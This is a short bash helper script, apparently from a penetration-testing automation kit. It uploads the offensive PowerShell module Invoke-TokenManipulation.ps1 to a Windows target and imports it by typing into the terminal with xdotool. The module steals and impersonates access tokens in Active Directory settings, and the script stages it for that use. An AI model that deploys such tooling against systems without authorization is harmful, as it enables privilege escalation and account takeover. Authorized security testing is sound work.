#!/bin/bash

: '
ps: Upload and import module Invoke-TokenManipulation.ps1
'

LOCATION="${SCRIPTS_DIR}/windows/activeDirectroy/invokeTokenManipulation/.files"
FILE="Invoke-TokenManipulation.ps1"

ps_webclient_upload_file "${LOCATION}" "${FILE}"

paste_command "Import-Module ${FILE_LOCATION}"
xdotool key Return
